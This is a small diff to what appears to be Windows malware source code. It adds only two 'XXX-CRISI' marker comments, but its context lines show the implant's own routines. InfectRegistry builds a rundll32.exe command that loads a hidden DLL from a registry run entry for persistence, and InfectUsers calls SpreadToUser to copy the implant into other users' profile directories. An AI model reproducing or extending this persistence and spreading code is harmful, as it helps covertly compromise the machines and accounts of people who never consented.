@@ -442,6 +442,7 @@ BOOL InfectRegistry(WCHAR *dest_dir, WCHAR *home_dir, WCHAR *user_sid)
 		return FALSE;
 	}
 	
+	// XXX-CRISI2
 	// Path a rundll32.exe
 	_snwprintf_s(tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]), _TRUNCATE, L"%%SystemRoot%%\\system32\\rundll32.exe \"%s\\%S\\%S\",%S", dest_dir, H4_HOME_DIR, H4DLLNAME, "PFTBBP8");
 	_snwprintf_s(uc_key, sizeof(uc_key)/sizeof(uc_key[0]), _TRUNCATE, L"%S", REGISTRY_KEY_NAME);
@@ -594,6 +595,7 @@ void InfectUsers()
 		
 		_snwprintf_s(tmp_buf, sizeof(tmp_buf)/sizeof(tmp_buf[0]), _TRUNCATE, L"%s%s", user_home, user_temp);	
 		tmp_ptr = GetLocalSettings(tmp_buf); // Ricava la directory LocalSettings partendo dalla TEMP
+		// XXX-CRISI1
 		if (SpreadToUser(tmp_ptr, user_home, user_sid)) {
 			if ( user_name = wcsrchr(user_home, L'\\') ) {
 				user_name++;
